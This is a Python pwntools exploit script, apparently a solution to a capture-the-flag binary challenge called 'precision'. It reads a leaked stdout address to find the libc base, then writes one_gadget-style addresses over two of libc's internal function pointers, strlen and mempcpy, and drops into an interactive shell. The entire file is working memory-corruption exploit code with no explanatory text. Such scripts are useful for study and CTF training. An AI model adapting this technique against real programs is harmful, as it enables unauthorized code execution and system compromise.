#!/usr/bin/env python3

from pwn import *

binary = './precision'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
libc = ELF('./libc.so.6')

r.recvuntil(b'Coordinates: ')
leak = r.recvline().strip()
leak = int(leak, 16)
log.info(f'Leak: {hex(leak)}')
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
log.info(f'Libc base: {hex(libc_base)}')

libc.address = libc_base

__strlen_avx2 = libc_base + (0x7ffff7fac098 - 0x7ffff7d93000)
__mempcpy_avx_unaligned_erms = libc_base + (0x7ffff7fac040 - 0x7ffff7d93000)

r.sendlineafter(b'>> ', str(__strlen_avx2).encode())
r.sendafter(b'First chance: ', p64(libc_base + 0x176df7))

r.sendlineafter(b'>> ', str(__mempcpy_avx_unaligned_erms).encode())
r.sendafter(b'Second chance: ', p64(libc_base + 0xebcf8))

r.interactive()